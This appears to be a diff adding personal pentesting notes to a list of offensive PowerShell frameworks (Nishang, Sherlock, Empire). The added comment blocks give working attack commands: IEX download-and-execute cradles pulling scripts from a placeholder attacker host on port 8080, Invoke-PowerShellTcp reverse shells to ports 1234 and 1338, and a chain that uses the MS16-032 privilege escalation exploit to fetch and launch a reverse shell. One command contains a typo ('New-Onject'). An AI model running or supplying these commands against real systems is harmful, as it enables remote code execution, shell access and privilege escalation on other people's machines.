@@ -1,8 +1,43 @@
 1. Nishang : A framework and collection of scripts and payloads which enables usage of PowerShell for offensive security(All phase)
 https://github.com/samratashok/nishang
 
+###################################################################################################################################
+# - From different shells, we take Invoke-PowerShellTcp.ps1 and at the end add < Invoke-PowerShellTcp -Reverse -IPAdress ip -Port 1234 >
+# - To download and execute powershell script in ps prompt : ## IEX = Invoke expression
+# IEX(New-Object Net.WebClient).downloadString('http://ip:8080/Invoke-PowerShellTcp.ps1')
+###################################################################################################################################
+
+Note : Location of 64 bit libraries are C:\Windows\SysNative\ and powershell location is : C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe 
+
+
 2. Sherlock : PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. 
 https://github.com/rasta-mouse/Sherlock
 
+###################################################################################################################################
+# - To find all functions in sherlock.ps1 script
+# grep -i function sherlock.ps1
+#
+# - at the end of the scripts, add < Find-AllVulns >
+#
+# - Invoke expression (IEX) in powershell prompt
+# IEX(New-Onject Net.Webclient).downloadString('http://ip:8080/sherlock.ps1')
+###################################################################################################################################
+
+
 3. Empire : A PowerShell and Python post-exploitation agent.
 https://github.com/EmpireProject/Empire
+###################################################################################################################################
+# Priv escalation of the vulnerability MS16-032 using Empire project.
+# Location : /opt/powershell-projects-pentest/Empire/data/module_source/privesc/Invoke-MS16032.ps1
+#
+# - At the end of the MS16-032 exploit, add
+# Invoke-MS16032 -command "iex(New-Object Net.WebClient).DownloadString('http://ip:8080/shell.ps1')"
+#
+# - To get the reverse shell, " cp Invoke-PowerShellTcp.ps1 shell.ps1 "
+# - At the end of shell.ps1 add,
+# Invoke-PowerShellTcp -Reverse -IPAddress ip -port 1338
+#
+# -In powershell prompt
+# IEX(New-Object Net.WebClient).downloadString('http://ip:8080/Invoke-MS-16032.ps1')
+#################################################################################################################################
+
